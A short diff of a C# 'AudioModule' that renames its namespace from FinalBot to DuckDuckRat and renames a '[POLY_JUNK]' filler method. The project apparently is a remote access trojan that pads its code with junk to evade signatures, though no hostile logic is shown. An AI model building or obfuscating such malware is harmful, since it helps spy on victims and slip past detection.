@@ -2,12 +2,12 @@ using System;
 using System.Runtime.InteropServices;
 using System.IO;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     public static class AudioModule
     {
         // [POLY_JUNK]
-        private static void _vanguard_c55eec1e() {
+        private static void _DuckDuckRat_c55eec1e() {
             int val = 98440;
             if (val > 50000) Console.WriteLine("Hash:" + 98440);
         }
@@ -41,3 +41,5 @@ namespace FinalBot.Modules
         }
     }
 }
+
+
